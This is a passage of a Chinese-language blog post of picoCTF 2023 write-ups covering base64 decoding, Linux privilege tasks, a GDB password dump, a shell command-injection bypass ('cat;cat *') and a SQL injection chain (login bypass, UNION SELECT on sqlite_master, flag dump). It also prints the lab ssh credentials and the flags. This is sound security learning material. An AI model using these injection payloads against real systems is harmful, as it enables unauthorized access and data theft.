<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Y0dsamIwTlVSbnRpWVhObE5qUmZiak56ZEROa1gyUnBZekJrSVc0NFgyUXdkMjVzTURSa00yUmZN</span><br><span class="line">V1V3TW1Fek1tWjlDZz09Cg==</span><br></pre></td></tr></table></figure>

<p>eeeeeeee</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cGljb0NURntiYXNlNjRfbjNzdDNkX2RpYzBkIW44X2Qwd25sMDRkM2RfMWUwMmEzMmZ9Cg==</span><br></pre></td></tr></table></figure>
<p>aaaaaaaaaa</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://media.tenor.com/eipo4TRTSKwAAAAd/moe-simpsons-barney-e-moe.gif"></p>
<blockquote>
<p>picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f}</p>
</blockquote>
<h3 id="Permissions"><a href="#Permissions" class="headerlink" title="Permissions"></a>Permissions</h3><pre><code>AUTHOR: GEOFFREY NJOGU

Description
Can you read files in the root file?
The system admin has provisioned an account for you on the main server:
ssh -p 53849 picoplayer@saturn.picoctf.net
Password: x+T6aPgE4-
Can you login and read the root file?    
</code></pre>
<p><img src="https://hackmd.io/_uploads/B1xxDTeI2.png"></p>
<blockquote>
<p>picoCTF{uS1ng_v1m_3dit0r_f6ad392b}</p>
</blockquote>
<p>水爛</p>
<h3 id="chrono"><a href="#chrono" class="headerlink" title="chrono"></a>chrono</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
How to automate tasks to run at intervals on linux servers?
Use ssh to connect to this server:
Server: saturn.picoctf.net
Port: 50602
Username: picoplayer 
Password: tPmsUpiHeZ
</code></pre>
<p><img src="https://hackmd.io/_uploads/ByLMuagIn.png"></p>
<blockquote>
<p>picoCTF{Sch3DUL7NG_T45K3_L1NUX_0bb95b71}</p>
</blockquote>
<p>?</p>
<h3 id="useless"><a href="#useless" class="headerlink" title="useless"></a>useless</h3><pre><code>AUTHOR: LOIC SHEMA

Description
There&#39;s an interesting script in the user&#39;s home directory
Additional details will be available after launching your challenge instance.
</code></pre>
<p><img src="https://hackmd.io/_uploads/HkhIYaeIn.png"></p>
<blockquote>
<p>picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_6173}</p>
</blockquote>
<h3 id="Special"><a href="#Special" class="headerlink" title="Special"></a>Special</h3><pre><code>AUTHOR: LT &#39;SYREAL&#39; JONES

Description
Don&#39;t power users get tired of making spelling mistakes in the shell? Not
anymore! Enter Special, the Spell Checked Interface for Affecting Linux.
Now, every word is properly spelled and capitalized... automatically and 
behind-the-scenes! Be the first to test Special in beta, and feel free to
tell us all about how Special streamlines every development process that
you face. When your co-workers see your amazing shell interface, just
tell them: That&#39;s Special (TM)
Start your instance to see connection details.
Additional details will be available after launching your challenge
instance.
</code></pre>
<p>這題會一直把輸入的指令變成很簡單的單字，然後把開頭用成大寫<br><code>ls</code>會變<code>Is</code><br><code>cat</code>會變<code>Cat</code>，但如果不是第一個字母就不會變大寫，所以可以用cat指令<br>用<code>;</code> 搭配Regex Command Injection</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat;cat *</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SJMKTpxLh.png"><br>發現目錄下面有一個資料夾<code>blargh</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat;cat blargh/*</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SyasaagIn.png"></p>
<blockquote>
<p>picoCTF{5p311ch3ck_15_7h3_w0r57_f578af59}</p>
</blockquote>
<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
Try reversing this file? Can ya?
I forgot the password to this file. Please find it for me?
</code></pre>
<p>題目給了一個檔案<code>ret</code>，執行後要輸密碼<br><img src="https://hackmd.io/_uploads/H1IQkCgU2.png"></p>
<p>丟GDB</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start </span><br><span class="line">c</span><br><span class="line">ctrl^C</span><br><span class="line">ni到死</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SJHUe0eL3.png"><br>在呼叫strcmp比對密碼時把<code>rsi</code> dump出來，得到前半截flag</p>
<blockquote>
<p>picoCTF{3lf_r3v3r5ing_succe55ful_9ae8528</p>
</blockquote>
<p>重新執行<code>ret</code>，輸入密碼<br><img src="https://hackmd.io/_uploads/HJwZb0l83.png"></p>
<blockquote>
<p>picoCTF{3lf_r3v3r5ing_succe55ful_9ae85289}</p>
</blockquote>
<h2 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h2><h3 id="More-SQLi"><a href="#More-SQLi" class="headerlink" title="More SQLi"></a>More SQLi</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
Can you find the flag on this website.
Additional details will be available after launching your challenge instance.
</code></pre>
<h4 id="Bypass-login"><a href="#Bypass-login" class="headerlink" title="Bypass login"></a>Bypass login</h4><p>進入網頁，經典登入介面<br><img src="https://hackmd.io/_uploads/SkQs-CeL3.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span></span><br><span class="line">password<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/HJnefAeU2.png"><br>題目很貼心把<code>query</code>都print出來給你</p>
<p>調整一下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span></span><br><span class="line">password<span class="operator">=</span><span class="string">&#x27; or 1=1;--</span></span><br></pre></td></tr></table></figure>

<p>進入之後有一個搜尋頁面<br><img src="https://hackmd.io/_uploads/SkTYRu-Uh.png"></p>
<h4 id="測試有幾個欄位"><a href="#測試有幾個欄位" class="headerlink" title="測試有幾個欄位"></a>測試有幾個欄位</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchInput<span class="operator">=</span><span class="string">&#x27; union select 1,2,3;--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/ByxzS0uW83.png"></p>
<h4 id="dump-Table"><a href="#dump-Table" class="headerlink" title="dump Table"></a>dump Table</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchInput<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/BJwUJt-Ln.png"><br>沒看到<code>flag</code>，可能在別的<code>table</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select group_concat(sql),2,3 from sqlite_master WHERE type=&#x27;</span><span class="keyword">table</span><span class="string">&#x27;;--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SkJ-xt-83.png"></p>
<p>現在知道<code>flag</code>應該在<code>more_table</code>的<code>flag_TEXT</code>欄位</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select flag,2,3 from more_table;--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/B16UGtZ82.png"></p>
<blockquote>
<p>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}</p>
</blockquote>
<h3 id="MatchTheRegex"><a href="#MatchTheRegex" class="headerlink" title="MatchTheRegex"></a>MatchTheRegex</h3><pre><code>AUTHOR: SUNDAY JACOB NWANYIM

Description
How about trying to match a regular expression
Additional details will be available after launching your challenge instance.
</code></pre>
<p>一開始沒看hint不知道到底要幹嘛<br><img src="https://hackmd.io/_uploads/rk36rFZ8h.png"></p>
<p>結果是要match<code>^p.....F!?</code><br><img src="https://hackmd.io/_uploads/SyhyLF-Uh.png"></p>
<p><img src="https://hackmd.io/_uploads/S1jOSFbLn.png"></p>
<blockquote>
<p>picoCTF{succ3ssfully_matchtheregex_9080e406}</p>
</blockquote>
<p>世紀水題</p>
<h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><pre><code>AUTHOR: GEOFFREY NJOGU

Description
Help us test the form by submiting the username as test and password as test!
Additional details will be available after launching your challenge instance.
</code></pre>
<p>先用<code>test</code> <code>test!</code>登入<br><img src="https://hackmd.io/_uploads/S1Q0_t-U2.png"></p>
<p>進去後他說<em>I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-)</em><br><img src="https://hackmd.io/_uploads/SyiWKKbU3.png"></p>
<h4 id="用BurpSuite查看被redirected的頁面"><a href="#用BurpSuite查看被redirected的頁面" class="headerlink" title="用BurpSuite查看被redirected的頁面"></a>用<code>BurpSuite</code>查看被redirected的頁面</h4><p><img src="https://hackmd.io/_uploads/SkjKtK-L2.png"><br>id看起來很像經典base64</p>
<p><img src="https://hackmd.io/_uploads/ryteqKbUh.png"><br><img src="https://hackmd.io/_uploads/HJZycFWLh.png"></p>
<blockquote>
<p>picoCTF{proxies_all_the_way_be716d8e}</p>
</blockquote>
</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://avatars.githubusercontent.com/u/46417323" alt="TriangleSnake"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">TriangleSnake</p><p class="is-size-6 is-block">National Cheng Kung University</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Taiwan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">12</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分類</p><a href="/categories"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">標籤</p><a href="/tags"><p class="title">16</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/TriangleSnake" target="_blank" rel="me noopener">追蹤</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/TriangleSnake"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分類</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Cybersecurity/"><span class="level-start"><span class="level-item">Cybersecurity</span></span><span class="level-end"><span class="level-item tag">10</span></span></a><ul><li><a class="level is-mobile" href="/categories/Cybersecurity/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">7</span></span></a><ul><li><a class="level is-mobile" href="/categories/Cybersecurity/CTF/Cheatsheet/"><span class="level-start"><span class="level-item">Cheatsheet</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Cybersecurity/CTF/Writeup/"><span class="level-start"><span class="level-item">Writeup</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/Cybersecurity/CVE/"><span class="level-start"><span class="level-item">CVE</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/Others/"><span class="level-start"><span class="level-item">Others</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-01-01T10:54:15.000Z">2025-01-01</time></p><p class="title"><a href="/2025/01/01/Confusion-Attacks-Exploiting-Hidden-Semantic-Ambiguity-In-Apache-HTTP-Server-Orange-Tsai/">Confusion Attacks: Exploiting Hidden Semantic Ambiguity In Apache HTTP Server! - Orange Tsai</a></p><p class="categories"><a href="/categories/Cybersecurity/">Cybersecurity</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-12-07T11:30:27.000Z">2024-12-07</time></p><p class="title"><a href="/2024/12/07/2024-CGGC-CTF-Final-Writeup/">2024 CGGC CTF Final Writeup</a></p><p class="categories"><a href="/categories/Cybersecurity/">Cybersecurity</a> / <a href="/categories/Cybersecurity/CTF/">CTF</a> / <a href="/categories/Cybersecurity/CTF/Writeup/">Writeup</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-11-18T11:22:14.000Z">2024-11-18</time></p><p class="title"><a href="/2024/11/18/%E8%B7%A8%E7%A7%91%E7%B3%BB%E6%8E%A8%E7%94%84%E5%9B%9B%E5%A4%A7%E8%B3%87%E5%AE%89%E6%89%80%E6%8E%A8%E7%94%84%E5%BF%83%E5%BE%97/">跨科系推甄四大資安所推甄心得</a></p><p class="categories"><a href="/categories/Others/">Others</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-10-30T18:02:43.000Z">2024-10-31</time></p><p class="title"><a href="/2024/10/31/One-Million-ASUS-Routers-Under-Control-Exploiting-ASUS-DDNS-to-MITM-Admin-Credentials/">One Million ASUS Routers Under Control: Exploiting ASUS DDNS to MITM Admin Credentials</a></p><p class="categories"><a href="/categories/Cybersecurity/">Cybersecurity</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-08-08T08:32:52.000Z">2024-08-08</time></p><p class="title"><a href="/2024/08/08/CVE-2024-4577-PHP-CGI%E6%BC%8F%E6%B4%9E%E8%A4%87%E7%8F%BE%E5%8F%8A%E7%A0%94%E7%A9%B6/">CVE-2024-4577 PHP CGI漏洞複現及研究</a></p><p class="categories"><a href="/categories/Cybersecurity/">Cybersecurity</a> / <a href="/categories/Cybersecurity/CVE/">CVE</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">彙整</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2025/01/"><span class="level-start"><span class="level-item">一月 2025</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/12/"><span class="level-start"><span class="level-item">十二月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/11/"><span class="level-start"><span class="level-item">十一月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/10/"><span class="level-start"><span class="level-item">十月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/08/"><span class="level-start"><span class="level-item">八月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/06/"><span class="level-start"><span class="level-item">六月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/05/"><span class="level-start"><span class="level-item">五月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/04/"><span class="level-start"><span class="level-item">四月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/02/"><span class="level-start"><span class="level-item">二月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/05/"><span class="level-start"><span class="level-item">五月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">標籤</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQLi/"><span class="tag">SQLi</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/apache/"><span class="tag">apache</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/argument-injection/"><span class="tag">argument injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/command-injection/"><span class="tag">command injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/misc/"><span class="tag">misc</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/proxmox/"><span class="tag">proxmox</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse/"><span class="tag">reverse</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/writeup/"><span class="tag">writeup</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8E%A8%E7%94%84/"><span class="tag">推甄</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%A0%94%E7%A9%B6%E6%89%80/"><span class="tag">研究所</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%B3%87%E5%AE%89/"><span class="tag">資安</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/triblog.svg" alt="TriangeSnake&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2025 TriangleSnake</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2024</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-tw");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到頁首" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="請輸入關鍵字..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"請輸入關鍵字...","untitled":"(無標題)","posts":"文章","pages":"頁面","categories":"分類","tags":"標籤"});
        });</script></body></html>